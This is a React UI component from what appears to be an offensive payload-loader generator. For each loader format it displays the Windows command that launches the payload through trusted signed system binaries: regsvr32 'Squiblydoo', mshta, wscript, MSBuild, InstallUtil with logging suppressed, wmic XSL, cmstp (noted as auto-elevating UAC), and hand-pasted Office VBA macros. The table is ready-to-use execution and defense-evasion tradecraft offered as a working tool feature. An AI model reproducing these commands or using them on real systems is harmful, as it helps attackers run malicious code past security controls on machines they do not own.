import { LoaderType } from '../api/generate'

const HINTS: Record<LoaderType, { cmd: string; signer: string; note?: string }> = {
  Binary:      { cmd: 'loader.exe',                                              signer: '(unsigned by default)' },
  Dll:         { cmd: 'rundll32 loader.dll,DllMain',                             signer: 'rundll32.exe' },
  Rundll32:    { cmd: 'rundll32 loader.dll,EntryPoint',                          signer: 'rundll32.exe' },
  AppDomain:   { cmd: 'Place loader.dll + .config near host .exe',               signer: 'Host process (.NET)' },
  Injector:    { cmd: 'loader.exe <target.exe>',                                 signer: '(unsigned by default)' },
  Wsf:         { cmd: 'wscript.exe loader.wsf',                                  signer: 'wscript.exe' },
  Hta:         { cmd: 'mshta.exe loader.hta',                                    signer: 'mshta.exe' },
  Regsvr32Sct: { cmd: 'regsvr32 /u /s /n /i:loader.sct scrobj.dll',              signer: 'regsvr32.exe (Squiblydoo)' },
  MsBuild:     { cmd: 'MSBuild.exe loader.csproj',                               signer: 'MSBuild.exe' },
  Cmstp:       { cmd: 'cmstp.exe /au loader.inf',                                signer: 'cmstp.exe (auto-elevates UAC)' },
  WmicXsl:     { cmd: 'wmic os get /format:"loader.xsl"',                        signer: 'wmic.exe' },
  DocxMacro:   { cmd: 'Open Word → Alt+F11 → ThisDocument → paste → save .docm', signer: 'WINWORD.EXE',
                 note: 'Output is plain .bas text — copy-paste into the Office VBA editor manually' },
  XlsxMacro:   { cmd: 'Open Excel → Alt+F11 → ThisWorkbook → paste → save .xlsm', signer: 'EXCEL.EXE',
                 note: 'Output is plain .bas text — copy-paste into the Office VBA editor manually' },
  InstallUtil: { cmd: 'installutil.exe /logfile= /LogToConsole=false /U loader.dll', signer: 'installutil.exe' },
}

interface Props { type: LoaderType }

export default function ExecHint({ type }: Props) {
  const h = HINTS[type]
  return (
    <div
      data-testid="exec-hint"
      className="rounded-xl p-4 mt-4"
      style={{ backgroundColor: 'rgba(124,58,237,0.06)', border: '1px solid rgba(124,58,237,0.3)' }}
    >
      <p className="text-xs uppercase tracking-widest mb-2" style={{ color: '#7c3aed' }}>
        Execution Command
      </p>
      <pre className="text-xs font-mono mb-2 whitespace-pre-wrap" style={{ color: '#e2e8f0' }}>{h.cmd}</pre>
      <p className="text-xs" style={{ color: '#64748b' }}>
        Signed by: <span style={{ color: '#e2e8f0' }}>{h.signer}</span>
      </p>
      {h.note && <p className="text-xs mt-1" style={{ color: '#fbbf24' }}>⚠ {h.note}</p>}
    </div>
  )
}
